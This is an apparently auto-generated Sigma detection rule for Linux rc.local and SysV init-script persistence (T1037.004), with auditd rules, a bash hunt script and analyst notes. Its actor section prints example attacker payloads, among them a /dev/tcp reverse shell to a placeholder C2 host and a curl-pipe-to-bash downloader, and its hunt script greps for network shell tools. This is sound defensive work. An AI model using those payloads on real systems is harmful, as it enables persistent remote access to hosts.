# sigma/rules/host/persistence/t1037_004_rc_local_and_sysv_init_script_persistence_rc_d_s.yml
# Generated by TONK sigma-export.py - do not edit by hand.
# Source of truth: host/js/data/persistence.js
title: T1037.004 - rc.local and SysV Init Script Persistence (rc*.d symlinks (update-rc.d creates these for autostart))
id: 8041a7a5-0404-55a0-913d-210d869e8e10
status: experimental
description: 'Modification of /etc/rc.local, /etc/rc.d/rc.local, addition of new init.d scripts in /etc/init.d/, or corresponding symlinks created in /etc/rc*.d/ for autostart Query block: rc*.d symlinks (update-rc.d creates these for autostart).'
author: TONK Hunt Reference (6b74.dev)
date: 2026/07/21
tags:
    - attack.persistence
    - attack.t1037.004
    - attack.g0096
    - attack.g0016
    - attack.g0034
logsource:
    category: file_event
    product: windows
detection:
    selection:
        event.module: file_integrity
        file.path: /etc/rc*.d/*
    condition: selection
falsepositives:
    - Unknown - baseline before enabling
level: high
tonk:
    fidelity: full
    source_file: host/js/data/persistence.js
    domain: host
    technique: T1037.004
    technique_name: 'Boot or Logon Initialization Scripts: RC Scripts'
    os: linux
    query_block: 3 of 7
    original_query: |-
        event.module: "file_integrity"
        AND file.path: (/etc/rc*.d/*)
    sysmon: |-
        # Auditd rules for RC script persistence

        # rc.local (most common vector)
        -w /etc/rc.local -p wa -k rclocal_write
        -w /etc/rc.d/rc.local -p wa -k rclocal_write  # RHEL path

        # SysV init.d script directory
        -w /etc/init.d -p wa -k initd_write

        # rcN.d symlink directories (update-rc.d creates these)
        -w /etc/rc0.d -p wa -k rcd_write
        -w /etc/rc1.d -p wa -k rcd_write
        -w /etc/rc2.d -p wa -k rcd_write
        -w /etc/rc3.d -p wa -k rcd_write
        -w /etc/rc4.d -p wa -k rcd_write
        -w /etc/rc5.d -p wa -k rcd_write
        -w /etc/rc6.d -p wa -k rcd_write
        -w /etc/rcS.d -p wa -k rcd_write

        # update-rc.d binary (registers init scripts)
        -a always,exit -F arch=b64 -S execve 
          -F path=/usr/sbin/update-rc.d -k rclocal_write

        # chkconfig (RHEL equivalent)
        -a always,exit -F arch=b64 -S execve 
          -F path=/usr/sbin/chkconfig -k rclocal_write

        # Sysmon for Linux EID 11:
        # TargetFilename = /etc/rc.local OR /etc/init.d/*
    powershell: |-
        #!/bin/bash
        # T1037.004 - RC Scripts / Init Persistence Hunt

        echo "[*] === /etc/rc.local status and content ==="
        for f in /etc/rc.local /etc/rc.d/rc.local; do
          [ -f "$f" ] || continue
          echo "--- $f ---"
          ls -la "$f"
          echo "Permissions: $(stat -c '%a' "$f")"
          echo "Content:"
          cat "$f"
          echo ""
        done

        echo ""
        echo "[*] === SysV init.d scripts (non-package) ==="
        for f in /etc/init.d/*; do
          [ -f "$f" ] || continue
          # Check if from package manager
          if ! (dpkg -S "$f" 2>/dev/null || rpm -qf "$f" 2>/dev/null) | grep -q .; then
            echo "[FLAG] Non-packaged init.d script: $f"
            ls -la "$f"
            head -20 "$f"
            echo ""
          fi
        done

        echo ""
        echo "[*] === rcN.d symlinks ==="
        for dir in /etc/rc0.d /etc/rc1.d /etc/rc2.d /etc/rc3.d 
                   /etc/rc4.d /etc/rc5.d /etc/rc6.d /etc/rcS.d; do
          [ -d "$dir" ] || continue
          echo "--- $dir ---"
          ls -la "$dir" 2>/dev/null
        done

        echo ""
        echo "[*] === Services registered via update-rc.d / chkconfig ==="
        if command -v service &>/dev/null; then
          service --status-all 2>/dev/null | grep "+"
        fi
        if command -v chkconfig &>/dev/null; then
          chkconfig --list 2>/dev/null
        fi

        echo ""
        echo "[*] === systemd rc-local compatibility service ==="
        # Modern systemd can run rc.local via rc-local.service
        systemctl status rc-local 2>/dev/null
        systemctl is-enabled rc-local 2>/dev/null

        echo ""
        echo "[*] === Suspicious content in init scripts ==="
        grep -rE 
          "(curl|wget|/tmp/|/dev/shm/|nc |ncat|bash -i|python|base64)" 
          /etc/init.d/ /etc/rc.local /etc/rc.d/ 2>/dev/null

        echo ""
        echo "[*] === Recently modified init files ==="
        find /etc/init.d /etc/rc.local /etc/rc.d 
          /etc/rc0.d /etc/rc1.d /etc/rc2.d /etc/rc3.d 
          /etc/rc4.d /etc/rc5.d /etc/rc6.d /etc/rcS.d 
          -mtime -7 -ls 2>/dev/null
    registry: |-
        RC script persistence locations:

        Primary:
          /etc/rc.local               - Debian/Ubuntu; runs at boot as root
          /etc/rc.d/rc.local          - RHEL/CentOS; same function
          (must be executable: chmod +x /etc/rc.local)

        SysV init.d system:
          /etc/init.d/<name>          - service script (LSB header required)
          /etc/rc2.d/S<num><name>     - symlink for run level 2 (multi-user)
          /etc/rc3.d/S<num><name>     - symlink for run level 3
          /etc/rc5.d/S<num><name>     - symlink for run level 5 (GUI)
          /etc/rcS.d/S<num><name>     - runs before numbered runlevels
          (S = Start, K = Kill; prefix number sets execution order)

        Registration commands (watched):
          update-rc.d <name> defaults  - Debian; creates rcN.d symlinks
          chkconfig --add <name>        - RHEL; registers for autostart
          insserv <name>                - alternate Debian registration

        systemd compatibility shim:
          /lib/systemd/system/rc-local.service
          (if enabled, systemd runs /etc/rc.local at boot via ExecStart)
          Check: systemctl is-enabled rc-local

        ESXi rc.local equivalent:
          /etc/rc.local.d/<name>.sh    - persistence on VMware ESXi
          /etc/init.d/<name>           - ESXi init system

        Adversary naming patterns:
          /etc/init.d/network-update   (spoofed system name)
          /etc/init.d/.hidden_service  (dot-prefixed to hide in ls)
          /etc/rc.local.bak            (trojanized "backup" copy)
    ossdetect: |-
        Sigma rules:
        - file_event_lnx_rc_local_modification.yml
        - file_event_lnx_initd_script_creation.yml
        - proc_creation_lnx_update_rcd_execution.yml
        - proc_creation_lnx_susp_rc_local_child.yml

        Elastic detection rules:
        - RC Script Modification
        - Potential rc.local Persistence
        - SysV Init Script Creation

        Atomic Red Team:
        - T1037.004 Test #1 (rc.local modification)
        - T1037.004 Test #2 (init.d script registration)

        PANIX:
        - ./panix.sh --rc-local
          Tests rc.local and init.d persistence vectors
          github.com/Aegrah/PANIX

        Wazuh syscheck:
          Configure to monitor /etc/rc.local, /etc/init.d/
          with alert on modification and new file creation

        Velociraptor:
        - Linux.Detection.Artifacts (includes rc.local check)
        - Linux.Sys.Services (includes SysV service enumeration)

        Package verify:
          dpkg --verify sysvinit-utils (Debian)
          rpm -V initscripts (RHEL)
          Verify no unexpected changes to init infrastructure

        auditd + ausearch:
          ausearch -k rclocal_write --start today
          ausearch -k initd_write --start today
    tools: |-
        APT actors and malware using RC script persistence:

        UNC3524 (China-nexus, Mandiant):
          - Documented use of rc.local for persistence on Linux servers
          - Used alongside SSH key injection for layered persistence
          - 18+ month dwell time on email infrastructure

        Sandworm / GRU (RU):
          - Industroyer2 campaign used init.d scripts on Linux hosts
          - Targeted ICS/OT-adjacent Linux systems

        ESXiArgs ransomware:
          - Used /etc/rc.local.d/ on VMware ESXi for persistence
          - Asher Langton documented custom Python backdoor via rc.local

        NCSC-documented actors:
          - Multiple state-sponsored groups documented using rc.local
          - Favored on older/RHEL-based infrastructure

        Common attacker rc.local payload patterns:
          # Append to /etc/rc.local (before 'exit 0'):
          /tmp/.daemon &

          # Single-line C2 callback:
          nohup bash -c 'bash -i >& /dev/tcp/C2/4444 0>&1' &

          # Downloader on boot:
          curl -s http://C2/loader | bash &

          # Persistent miner:
          /usr/lib/update-notifier/miner --config /etc/.config &

          # enable rc.local if it exists but isn't executable:
          chmod +x /etc/rc.local

        update-rc.d / chkconfig abuse:
          update-rc.d evil-service defaults
          chkconfig --add evil-service; chkconfig evil-service on
    actors:
        - APT41
        - UNC3524
        - Sandworm
    analyst_notes: 'RC scripts are a legacy persistence mechanism that remains highly relevant because /etc/rc.local is still present and functional on most modern Linux distributions (typically bridged through the systemd rc-local.service compatibility unit). Unlike systemd services, rc.local requires no service file, no systemctl enable, and generates minimal audit artifacts if auditd isn''t watching the file. On many default installations, /etc/rc.local exists but is empty or absent, making any new content immediately suspicious. The two-step detection: (1) watch for writes to /etc/rc.local and /etc/init.d/* in real time via auditd or file integrity monitoring; (2) sweep for anomalous content (especially payloads in /tmp, curl/wget, background processes with &) in any existing init scripts. SysV init.d scripts are slightly more complex because they require both the script file and rcN.d symlinks for autostart - however, the update-rc.d binary execution is a high-confidence signal, especially if invoked by a non-root user or a suspicious parent process. On ESXi, /etc/rc.local.d/*.sh is the equivalent and has been exploited by ransomware operators. Verify ESXi init scripts against VMware''s published baseline or your golden image.'
